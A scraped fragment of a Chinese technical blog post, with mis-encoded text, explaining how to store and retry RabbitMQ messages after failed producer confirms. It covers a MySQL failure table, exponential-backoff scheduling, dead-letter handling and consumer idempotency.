#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¦å®ç°ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶å¤±è´¥å<strong>è‡ªåŠ¨é‡è¯•é‡æ–°æŠ•é€’</strong>ï¼Œæ ¸å¿ƒæ€è·¯æ˜¯ï¼š<strong>å°†å‘é€å¤±è´¥çš„æ¶ˆæ¯æš‚å­˜â†’æŒ‰ç­–ç•¥é‡è¯•â†’è·Ÿè¸ªé‡è¯•çŠ¶æ€â†’å¤±è´¥å…œåº•</strong>ã€‚ä»¥ä¸‹æ˜¯å…·ä½“å®ç°æ€è·¯å’Œå…³é”®æ­¥éª¤ï¼Œç»“åˆä»£ç ç¤ºä¾‹è¯´æ˜ã€‚</p>
<h3 data-id="heading-0"><strong>ä¸€ã€æ ¸å¿ƒæ€è·¯æ¡†æ¶</strong></h3>
<p>å½“ç”Ÿäº§è€…é€šè¿‡Â <code>ConfirmCallback</code>Â æ”¶åˆ°Â <code>ack=false</code>ï¼ˆBroker æœªç¡®è®¤æ¥æ”¶ï¼‰æˆ–è¶…æ—¶æœªæ”¶åˆ°ç¡®è®¤æ—¶ï¼Œè¯´æ˜æ¶ˆæ¯å‘é€å¤±è´¥ã€‚æ­¤æ—¶éœ€å°†æ¶ˆæ¯<strong>æš‚å­˜åˆ°å¯é å­˜å‚¨</strong>ï¼ˆé¿å…å†…å­˜ä¸¢å¤±ï¼‰ï¼Œå¹¶æŒ‰<strong>é‡è¯•ç­–ç•¥</strong>ï¼ˆæ¬¡æ•°ã€é—´éš”ï¼‰é‡æ–°æŠ•é€’ï¼Œç›´è‡³æˆåŠŸæˆ–è¶…è¿‡é˜ˆå€¼åè½¬å…¥æ­»ä¿¡é˜Ÿåˆ—ã€‚</p>
<h3 data-id="heading-1"><strong>äºŒã€å…³é”®å®ç°æ­¥éª¤</strong></h3>
<h4 data-id="heading-2"><strong>1. å®šä¹‰â€œå¤±è´¥æ¶ˆæ¯â€å­˜å‚¨ç»“æ„</strong></h4>
<p>éœ€æŒä¹…åŒ–å­˜å‚¨å¤±è´¥æ¶ˆæ¯çš„<strong>æ ¸å¿ƒä¿¡æ¯</strong>ï¼Œç¡®ä¿é‡å¯åä¸ä¸¢å¤±ã€‚æ¨èç”¨Â <strong>æ•°æ®åº“</strong>ï¼ˆMySQL/PostgreSQLï¼‰æˆ–Â <strong>Redis</strong>ï¼ˆç¼“å­˜+æŒä¹…åŒ–ï¼‰ï¼Œå­—æ®µåŒ…æ‹¬ï¼š</p>


















































<table><thead><tr><th>å­—æ®µå</th><th>è¯´æ˜</th><th>ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td><code>msg_id</code></td><td>æ¶ˆæ¯å”¯ä¸€IDï¼ˆCorrelationDataçš„IDï¼‰</td><td><code>MSG-1690000000000-0.123456</code></td></tr><tr><td><code>exchange</code></td><td>ç›®æ ‡äº¤æ¢æœºåç§°</td><td><code>order.exchange</code></td></tr><tr><td><code>routing_key</code></td><td>ç›®æ ‡è·¯ç”±é”®</td><td><code>order.routingKey</code></td></tr><tr><td><code>message_body</code></td><td>æ¶ˆæ¯ä½“ï¼ˆJSONåºåˆ—åŒ–ï¼‰</td><td><code>{"id":1001,"amount":99.9}</code></td></tr><tr><td><code>retry_count</code></td><td>å½“å‰é‡è¯•æ¬¡æ•°</td><td><code>0</code>ï¼ˆåˆå§‹å€¼ï¼‰</td></tr><tr><td><code>max_retry</code></td><td>æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ˆå¦‚3æ¬¡ï¼‰</td><td><code>3</code></td></tr><tr><td><code>next_retry_time</code></td><td>ä¸‹æ¬¡é‡è¯•æ—¶é—´ï¼ˆæ—¶é—´æˆ³ï¼‰</td><td><code>1690000060000</code>ï¼ˆå½“å‰æ—¶é—´+10ç§’ï¼‰</td></tr><tr><td><code>status</code></td><td>çŠ¶æ€ï¼ˆå¾…é‡è¯•/é‡è¯•ä¸­/å¤±è´¥ï¼‰</td><td><code>PENDING</code></td></tr></tbody></table>
<h4 data-id="heading-3"><strong>2. å®ç°â€œå¤±è´¥æ¶ˆæ¯â€å­˜å‚¨å±‚</strong></h4>
<p>ä»¥Â <strong>MySQL</strong>Â ä¸ºä¾‹ï¼Œåˆ›å»ºè¡¨å­˜å‚¨å¤±è´¥æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> mq_failed_message (
    id <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTO_INCREMENT,
    msg_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">UNIQUE</span> COMMENT <span class="hljs-string">'æ¶ˆæ¯å”¯ä¸€ID'</span>,
    exchange <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'äº¤æ¢æœº'</span>,
    routing_key <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'è·¯ç”±é”®'</span>,
    message_body TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'æ¶ˆæ¯ä½“(JSON)'</span>,
    retry_count <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'å½“å‰é‡è¯•æ¬¡æ•°'</span>,
    max_retry <span class="hljs-type">INT</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">3</span> COMMENT <span class="hljs-string">'æœ€å¤§é‡è¯•æ¬¡æ•°'</span>,
    next_retry_time <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'ä¸‹æ¬¡é‡è¯•æ—¶é—´æˆ³(ms)'</span>,
    status <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'PENDING'</span> COMMENT <span class="hljs-string">'çŠ¶æ€:PENDING/RETRYING/FAILED'</span>,
    created_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    updated_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    INDEX idx_next_retry_time (next_retry_time) COMMENT <span class="hljs-string">'æŒ‰ä¸‹æ¬¡é‡è¯•æ—¶é—´ç´¢å¼•'</span>
);
</code></pre>
<h4 data-id="heading-4"><strong>3. å‘é€æ¶ˆæ¯æ—¶å…³è”â€œå¤±è´¥å­˜å‚¨â€</strong></h4>
<p>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯æ—¶ï¼Œç”Ÿæˆå”¯ä¸€Â <code>msg_id</code>ï¼ˆå¦‚ UUID æˆ–é›ªèŠ±ç®—æ³•ï¼‰ï¼Œå¹¶åœ¨Â <code>ConfirmCallback</code>Â ä¸­å¤„ç†å¤±è´¥é€»è¾‘ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class RetryProducer {
    <span class="hljs-keyword">@Autowired</span>
    private RabbitTemplate rabbitTemplate;
    <span class="hljs-keyword">@Autowired</span>
    private FailedMessageStorage failedMessageStorage; <span class="hljs-comment">// å¤±è´¥æ¶ˆæ¯å­˜å‚¨æ¥å£</span>

    public void <span class="hljs-built_in">sendWithRetry</span>(Object message, String exchange, String routingKey) {
        <span class="hljs-comment">// 1. ç”Ÿæˆå”¯ä¸€æ¶ˆæ¯ID</span>
        String msgId = "MSG-" + System<span class="hljs-selector-class">.currentTimeMillis</span>() + "-" + UUID<span class="hljs-selector-class">.randomUUID</span>()<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>);
        CorrelationData correlationData = new <span class="hljs-built_in">CorrelationData</span>(msgId);

        <span class="hljs-comment">// 2. å‘é€æ¶ˆæ¯ï¼ˆæºå¸¦CorrelationDataï¼‰</span>
        rabbitTemplate<span class="hljs-selector-class">.convertAndSend</span>(exchange, routingKey, message, correlationData);

        <span class="hljs-comment">// 3. æ³¨å†Œç¡®è®¤å›è°ƒï¼ˆå¤„ç†æˆåŠŸ/å¤±è´¥ï¼‰</span>
        rabbitTemplate<span class="hljs-selector-class">.setConfirmCallback</span>((correlationData1, ack, cause) -&gt; {
            String id = correlationData1 != null ? correlationData1<span class="hljs-selector-class">.getId</span>() : null;
            if (id == null) return;

            if (ack) {
                <span class="hljs-comment">// ç¡®è®¤æˆåŠŸï¼šåˆ é™¤å­˜å‚¨ä¸­çš„å¤±è´¥è®°å½•ï¼ˆè‹¥æœ‰ï¼‰</span>
                failedMessageStorage<span class="hljs-selector-class">.deleteById</span>(id);
                System<span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>("æ¶ˆæ¯ç¡®è®¤æˆåŠŸï¼ŒID: " + id);
            } else {
                <span class="hljs-comment">// ç¡®è®¤å¤±è´¥ï¼šå­˜å…¥å¤±è´¥æ¶ˆæ¯è¡¨ï¼Œç­‰å¾…é‡è¯•</span>
                FailedMessage failedMsg = new <span class="hljs-built_in">FailedMessage</span>();
                failedMsg<span class="hljs-selector-class">.setMsgId</span>(id);
                failedMsg<span class="hljs-selector-class">.setExchange</span>(exchange);
                failedMsg<span class="hljs-selector-class">.setRoutingKey</span>(routingKey);
                failedMsg<span class="hljs-selector-class">.setMessageBody</span>(JSON.toJSONString(message)); <span class="hljs-comment">// åºåˆ—åŒ–ä¸ºJSON</span>
                failedMsg<span class="hljs-selector-class">.setRetryCount</span>(<span class="hljs-number">0</span>);
                failedMsg<span class="hljs-selector-class">.setMaxRetry</span>(<span class="hljs-number">3</span>);
                failedMsg<span class="hljs-selector-class">.setNextRetryTime</span>(System.currentTimeMillis() + <span class="hljs-number">10</span> * <span class="hljs-number">1000</span>); <span class="hljs-comment">// 10ç§’åé‡è¯•</span>
                failedMsg<span class="hljs-selector-class">.setStatus</span>("PENDING");
                failedMessageStorage<span class="hljs-selector-class">.save</span>(failedMsg);
                System<span class="hljs-selector-class">.err</span><span class="hljs-selector-class">.println</span>("æ¶ˆæ¯ç¡®è®¤å¤±è´¥ï¼Œå­˜å…¥é‡è¯•é˜Ÿåˆ—ï¼ŒID: " + id + "ï¼ŒåŸå› : " + cause);
            }
        });
    }
}
</code></pre>
<h4 data-id="heading-5"><strong>4. å®ç°é‡è¯•è°ƒåº¦å™¨ï¼ˆæ ¸å¿ƒï¼‰</strong></h4>
<p>é€šè¿‡Â <strong>å®šæ—¶ä»»åŠ¡</strong>ï¼ˆå¦‚ Spring Schedulerï¼‰æˆ–Â <strong>çº¿ç¨‹æ± </strong>Â å®šæœŸæ£€æŸ¥å¤±è´¥æ¶ˆæ¯è¡¨ï¼Œå¯¹Â <code>next_retry_time â‰¤ å½“å‰æ—¶é—´</code>Â çš„æ¶ˆæ¯æ‰§è¡Œé‡è¯•ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Component</span>
<span class="hljs-variable">@EnableScheduling</span>
public class RetryScheduler {
    <span class="hljs-variable">@Autowired</span>
    private FailedMessageStorage failedMessageStorage;
    <span class="hljs-variable">@Autowired</span>
    private RabbitTemplate rabbitTemplate;
    <span class="hljs-variable">@Autowired</span>
    private DeadLetterQueueHandler deadLetterQueueHandler; <span class="hljs-comment">// æ­»ä¿¡é˜Ÿåˆ—å¤„ç†å™¨</span>

    <span class="hljs-comment">// æ¯5ç§’æ‰«æä¸€æ¬¡å¾…é‡è¯•æ¶ˆæ¯</span>
    <span class="hljs-variable">@Scheduled</span>(fixedRate = <span class="hljs-number">5000</span>)
    public void <span class="hljs-built_in">retryFailedMessages</span>() {
        <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">FailedMessage</span>&gt; <span class="hljs-selector-tag">pendingMsgs</span> = <span class="hljs-selector-tag">failedMessageStorage</span><span class="hljs-selector-class">.queryPendingMessages</span>(System.<span class="hljs-built_in">currentTimeMillis</span>());
        <span class="hljs-selector-tag">for</span> (FailedMessage <span class="hljs-attribute">msg </span>: pendingMsgs) {
            <span class="hljs-selector-tag">try</span> {
                <span class="hljs-comment">// 1. æ ‡è®°ä¸ºâ€œé‡è¯•ä¸­â€ï¼ˆé¿å…å¹¶å‘é‡å¤å¤„ç†ï¼‰</span>
                <span class="hljs-selector-tag">failedMessageStorage</span><span class="hljs-selector-class">.updateStatus</span>(msg.<span class="hljs-built_in">getMsgId</span>(), <span class="hljs-string">"RETRYING"</span>);

                <span class="hljs-comment">// 2. ååºåˆ—åŒ–æ¶ˆæ¯ä½“</span>
                <span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">message</span> = <span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.parseObject</span>(msg.<span class="hljs-built_in">getMessageBody</span>(), Object.class); <span class="hljs-comment">// æ ¹æ®å®é™…ç±»å‹å¼ºè½¬</span>

                <span class="hljs-comment">// 3. é‡æ–°å‘é€æ¶ˆæ¯ï¼ˆæºå¸¦åŸmsgIdï¼‰</span>
                <span class="hljs-selector-tag">CorrelationData</span> <span class="hljs-selector-tag">correlationData</span> = <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">CorrelationData</span>(msg.<span class="hljs-built_in">getMsgId</span>());
                <span class="hljs-selector-tag">rabbitTemplate</span><span class="hljs-selector-class">.convertAndSend</span>(msg.<span class="hljs-built_in">getExchange</span>(), msg.<span class="hljs-built_in">getRoutingKey</span>(), message, correlationData);

                <span class="hljs-comment">// 4. æ›´æ–°é‡è¯•æ¬¡æ•°å’Œä¸‹æ¬¡é‡è¯•æ—¶é—´ï¼ˆæŒ‡æ•°é€€é¿ï¼š10sâ†’20sâ†’40sï¼‰</span>
                <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">newRetryCount</span> = <span class="hljs-selector-tag">msg</span><span class="hljs-selector-class">.getRetryCount</span>() + <span class="hljs-number">1</span>;
                <span class="hljs-selector-tag">long</span> <span class="hljs-selector-tag">nextRetryInterval</span> = (long) (<span class="hljs-number">10</span> * Math.<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, newRetryCount - <span class="hljs-number">1</span>)) * <span class="hljs-number">1000</span>; <span class="hljs-comment">// æŒ‡æ•°é€€é¿</span>
                <span class="hljs-selector-tag">long</span> <span class="hljs-selector-tag">nextRetryTime</span> = <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.currentTimeMillis</span>() + <span class="hljs-selector-tag">nextRetryInterval</span>;

                <span class="hljs-selector-tag">if</span> (newRetryCount &gt;= msg.<span class="hljs-built_in">getMaxRetry</span>()) {
                    <span class="hljs-comment">// è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°ï¼šè½¬å…¥æ­»ä¿¡é˜Ÿåˆ—</span>
                    <span class="hljs-selector-tag">deadLetterQueueHandler</span><span class="hljs-selector-class">.sendToDlx</span>(msg);
                    <span class="hljs-selector-tag">failedMessageStorage</span><span class="hljs-selector-class">.updateStatus</span>(msg.<span class="hljs-built_in">getMsgId</span>(), <span class="hljs-string">"FAILED"</span>);
                    <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.err</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"æ¶ˆæ¯é‡è¯•æ¬¡æ•°è€—å°½ï¼Œè½¬å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼ŒID: "</span> + msg.<span class="hljs-built_in">getMsgId</span>());
                } <span class="hljs-selector-tag">else</span> {
                    <span class="hljs-comment">// æ›´æ–°é‡è¯•çŠ¶æ€ï¼ˆæ¬¡æ•°+1ï¼Œä¸‹æ¬¡é‡è¯•æ—¶é—´ï¼‰</span>
                    <span class="hljs-selector-tag">failedMessageStorage</span><span class="hljs-selector-class">.updateRetryInfo</span>(msg.<span class="hljs-built_in">getMsgId</span>(), newRetryCount, nextRetryTime, <span class="hljs-string">"PENDING"</span>);
                    <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"æ¶ˆæ¯é‡è¯•ä¸­ï¼ŒID: "</span> + msg.<span class="hljs-built_in">getMsgId</span>() + <span class="hljs-string">"ï¼Œç¬¬"</span> + newRetryCount + <span class="hljs-string">"æ¬¡"</span>);
                }
            } <span class="hljs-selector-tag">catch</span> (Exception e) {
                <span class="hljs-comment">// é‡è¯•è¿‡ç¨‹ä¸­å¼‚å¸¸ï¼šæ¢å¤çŠ¶æ€ä¸ºPENDINGï¼Œç­‰å¾…ä¸‹æ¬¡æ‰«æ</span>
                <span class="hljs-selector-tag">failedMessageStorage</span><span class="hljs-selector-class">.updateStatus</span>(msg.<span class="hljs-built_in">getMsgId</span>(), <span class="hljs-string">"PENDING"</span>);
                <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.err</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"é‡è¯•å‘é€å¤±è´¥ï¼ŒID: "</span> + msg.<span class="hljs-built_in">getMsgId</span>() + <span class="hljs-string">"ï¼Œé”™è¯¯: "</span> + e.<span class="hljs-built_in">getMessage</span>());
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-6"><strong>5. æ­»ä¿¡é˜Ÿåˆ—å…œåº•ï¼ˆé‡è¯•å¤±è´¥çš„æœ€ç»ˆå¤„ç†ï¼‰</strong></h4>
<p>å½“æ¶ˆæ¯è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°ä»æœªæˆåŠŸï¼Œå°†å…¶è½¬å…¥<strong>æ­»ä¿¡é˜Ÿåˆ—ï¼ˆDLXï¼‰</strong> ï¼Œäººå·¥ä»‹å…¥å¤„ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLetterQueueHandler</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendToDlx</span><span class="hljs-params">(FailedMessage msg)</span> {
        <span class="hljs-comment">// å‘é€åˆ°æ­»ä¿¡äº¤æ¢æœºï¼ˆéœ€æå‰é…ç½®æ­»ä¿¡é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼‰</span>
        rabbitTemplate.convertAndSend(
            <span class="hljs-string">"dlx.exchange"</span>, 
            <span class="hljs-string">"dlx.routingKey"</span>, 
            msg.getMessageBody(),
            message -&gt; {
                <span class="hljs-type">MessageProperties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> message.getMessageProperties();
                props.setHeader(<span class="hljs-string">"failed_reason"</span>, <span class="hljs-string">"max_retry_exceeded"</span>);
                props.setHeader(<span class="hljs-string">"original_msg_id"</span>, msg.getMsgId());
                <span class="hljs-keyword">return</span> message;
            }
        );
    }
}
</code></pre>
<h3 data-id="heading-7"><strong>ä¸‰ã€å…³é”®æŠ€æœ¯ç‚¹è¯´æ˜</strong></h3>
<h4 data-id="heading-8"><strong>1. é‡è¯•ç­–ç•¥</strong></h4>
<ul>
<li><strong>æŒ‡æ•°é€€é¿</strong>ï¼šé‡è¯•é—´éš”éšæ¬¡æ•°é€’å¢ï¼ˆå¦‚ 10sâ†’20sâ†’40sï¼‰ï¼Œé¿å…é›†ä¸­é‡è¯•å‹å® Brokerï¼›</li>
<li><strong>å›ºå®šé—´éš”</strong>ï¼šç®€å•åœºæ™¯ç”¨å›ºå®šé—´éš”ï¼ˆå¦‚æ¯ 30 ç§’é‡è¯•ä¸€æ¬¡ï¼‰ï¼›</li>
<li><strong>éšæœºé—´éš”</strong>ï¼šé¿å…å¤šä¸ªç”Ÿäº§è€…åŒæ—¶é‡è¯•å¯¼è‡´â€œæƒŠç¾¤æ•ˆåº”â€ã€‚</li>
</ul>
<h4 data-id="heading-9"><strong>2. å¹‚ç­‰æ€§ä¿éšœ</strong></h4>
<p>é‡è¯•å¯èƒ½å¯¼è‡´æ¶ˆæ¯é‡å¤æŠ•é€’ï¼Œæ¶ˆè´¹è€…éœ€é€šè¿‡Â <strong>å”¯ä¸€IDå»é‡</strong>ï¼ˆå¦‚ Redis è®°å½•å·²å¤„ç†Â <code>msg_id</code>ï¼Œæœ‰æ•ˆæœŸ 24 å°æ—¶ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IdempotentConsumer</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RedisTemplate</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; redisTemplate;

    <span class="hljs-meta">@RabbitListener</span>(queues = <span class="hljs-string">"order.queue"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">consume</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> message, <span class="hljs-meta">@Header</span>(<span class="hljs-string">"msg_id"</span>) <span class="hljs-built_in">String</span> msgId</span>) {
        <span class="hljs-title class_">String</span> key = <span class="hljs-string">"processed_msg:"</span> + msgId;
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Boolean</span>.<span class="hljs-property">TRUE</span>.<span class="hljs-title function_">equals</span>(redisTemplate.<span class="hljs-title function_">hasKey</span>(key))) {
            <span class="hljs-comment">// å·²å¤„ç†ï¼Œç›´æ¥ç¡®è®¤</span>
            channel.<span class="hljs-title function_">basicAck</span>(deliveryTag, <span class="hljs-literal">false</span>);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘å¤„ç†...</span>
        redisTemplate.<span class="hljs-title function_">opsForValue</span>().<span class="hljs-title function_">set</span>(key, <span class="hljs-string">"1"</span>, <span class="hljs-number">24</span>, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">HOURS</span>); <span class="hljs-comment">// è®°å½•å·²å¤„ç†</span>
        channel.<span class="hljs-title function_">basicAck</span>(deliveryTag, <span class="hljs-literal">false</span>);
    }
}
</code></pre>
<h4 data-id="heading-10"><strong>3. å­˜å‚¨é€‰å‹å¯¹æ¯”</strong></h4>





























<table><thead><tr><th>å­˜å‚¨æ–¹å¼</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>MySQL</td><td>æŒä¹…åŒ–å¯é ï¼Œæ”¯æŒå¤æ‚æŸ¥è¯¢</td><td>æ€§èƒ½è¾ƒä½ï¼Œéœ€ç»´æŠ¤æ•°æ®åº“è¿æ¥</td><td>ç”Ÿäº§ç¯å¢ƒï¼ˆæ¶ˆæ¯é‡è¦æ€§é«˜ï¼‰</td></tr><tr><td>Redis</td><td>é«˜æ€§èƒ½ï¼Œæ”¯æŒè¿‡æœŸæ—¶é—´</td><td>æ•°æ®æ˜“å¤±ï¼ˆéœ€å¼€å¯RDB/AOFæŒä¹…åŒ–ï¼‰</td><td>ä¸­å°è§„æ¨¡ã€å¯¹æ€§èƒ½è¦æ±‚é«˜çš„åœºæ™¯</td></tr><tr><td>å†…å­˜é˜Ÿåˆ—</td><td>é€Ÿåº¦å¿«</td><td>é‡å¯ä¸¢å¤±æ¶ˆæ¯</td><td>æµ‹è¯•ç¯å¢ƒæˆ–ä¸´æ—¶é‡è¯•</td></tr></tbody></table>
<h3 data-id="heading-11"><strong>å››ã€æ€»ç»“</strong></h3>
<p>ç”Ÿäº§è€…ç¡®è®¤å¤±è´¥åçš„é‡è¯•é‡æ–°æŠ•é€’ï¼Œæœ¬è´¨æ˜¯ <strong>â€œå­˜å‚¨-è°ƒåº¦-é‡è¯•-å…œåº•â€</strong> çš„é—­ç¯ï¼š</p>
<ol>
<li><strong>å­˜å‚¨</strong>ï¼šç”¨æ•°æ®åº“/Redis æŒä¹…åŒ–å¤±è´¥æ¶ˆæ¯ï¼›</li>
<li><strong>è°ƒåº¦</strong>ï¼šå®šæ—¶ä»»åŠ¡æ‰«æå¾…é‡è¯•æ¶ˆæ¯ï¼›</li>
<li><strong>é‡è¯•</strong>ï¼šæŒ‰æŒ‡æ•°é€€é¿ç­–ç•¥é‡æ–°å‘é€ï¼Œæ›´æ–°é‡è¯•çŠ¶æ€ï¼›</li>
<li><strong>å…œåº•</strong>ï¼šè¶…è¿‡æ¬¡æ•°åè½¬å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼Œäººå·¥ä»‹å…¥ã€‚</li>
</ol>
<p>é€šè¿‡è¿™å¥—æœºåˆ¶ï¼Œå¯ç¡®ä¿æ¶ˆæ¯åœ¨<strong>ç½‘ç»œæŠ–åŠ¨ã€Broker ä¸´æ—¶ä¸å¯ç”¨</strong>ç­‰åœºæ™¯ä¸‹ä»èƒ½æœ€ç»ˆæŠ•é€’æˆåŠŸï¼ŒåŒæ—¶é¿å…æ— é™é‡è¯•çš„èµ„æºæµªè´¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šCommonJS ä¸ES6 æ¨¡å—]]></title>    <link>https://juejin.cn/post/7580745065171419187</link>    <guid>https://juejin.cn/post/7580745065171419187</guid>    <pubDate>2025-12-08T06:09:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580745065171419187" data-draft-id="7580971667037503514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šCommonJS ä¸ES6 æ¨¡å—"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-08T06:09:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šCommonJS ä¸ES6 æ¨¡å—
